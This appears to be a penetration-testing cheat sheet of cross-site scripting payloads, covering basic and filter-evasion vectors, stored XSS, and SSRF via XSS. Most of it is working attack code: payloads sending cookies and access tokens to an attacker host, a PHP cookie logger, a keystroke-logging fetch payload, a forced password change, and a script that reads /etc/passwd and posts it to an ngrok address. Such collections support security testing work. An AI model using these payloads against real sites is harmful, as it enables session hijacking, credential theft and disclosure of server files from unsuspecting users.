---
icon: file-code
---
# XSS

## Reflected XSS - Basic

```bash
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<script>debugger;</script>
<svg onload=alert(1)>
<svg/onload=alert(1)><svg>
<svg	onload=alert(1)><svg>
<svg><animate onbegin=alert("XSS") attributeName=x></svg>
<svg onload=alert&lpar;1&rpar;></svg>
<script>alert(1)</script>
</script><script>alert(1)</script>
<img src=x onerror=alert(navigator.appVersion)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(window.location)>
```

## Reflected XSS - Filter Evasion

```bash
# Basic
<ScRiPt>alert(1);</ScRiPt>
<ScRiPt>alert(1);
<script/random>alert(1);</script>
>alert(1);</script>
<scr<script>ipt>alert(1)</scr<script>ipt>
<<script>script>alert(1);</</script>script>
<scr\x00ipt>alert(1)</scr\x00ipt>
<script><svg/onload=alert(1)></script>

# HTML tags
<a href="javascript:alert(1)">show </a>
<form action="javascript:alert(1)"><button>send</button></form>
<object data"javascript:alert(1)">

# HTML events
<body/onload=alert(1)>
<svg/onload=alert(1)>
<svg////onload=alert(1)>
<svg id='x';onload=alert(1)>
<svg onload%09=alert(1)>
<svg %09onload=alert(1)>

# Character escaping
<script>\u0061lert(1);</script>
<script>\u0061\u006C\u0065\u0072\u0074(1);</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
<script>eval("\u0061lert(1)")</script>

# Sanitization escape
<scr<script>ipt>alert(1)</scr<script>ipt>
<scr<script>ipt>alert(1)</script>
<scr<iframe>ipt>alert(1)</script>

# Escaping quotes '
\'alert(1);//

# URL encoding
%253cimg src=x onerror=alert(1)%253e

```

## Stored XSS

### Data grabber for XSS

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```php
<script>document.location='http://attacker/grabber.php?c='+document.cookie</script>
<script>document.location='http://attacker/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://attacker/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://attacker/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### Javascript keylogger

Another way to collect sensitive data is to set a Javascript keylogger.

```php
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Password changer

Redirects the user to a password change when it visits the page.

```php
<script>fetch('/settings?new_password=pass123');</script>
```

## SSRF via XSS

### Load external scripts via JS

Send the payload:

```jsx
<script src=http://attacker.com/a.js />
```

Script hosted on attacker machine to get local files, and POST back to attacker:

```php
var req1=new XMLHttpRequest();
req1.open("GET", "file:///etc/passwd", false); 
req1.send();
var response = req1.responseText;
var req2=new XMLHttpRequest();
var params = "data=" + encodeURIComponent(response);
req2.open("POST", "http://20bf-141-168-116-205.ngrok.io/caue", true);
req2.setRequestHeader('Content-Type', 'application/x-www-urlencoded')
req2.send(params);
```

### Local files using PHP redirection

Send the payload:

```php
<iframe src="http://attacker.com/redirect.php">
```

File hosted on attacker machine - Redirect to local file:

```php
<?php
 header("Location: file:///etc/passwd");
?>
```

Many more payloads at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
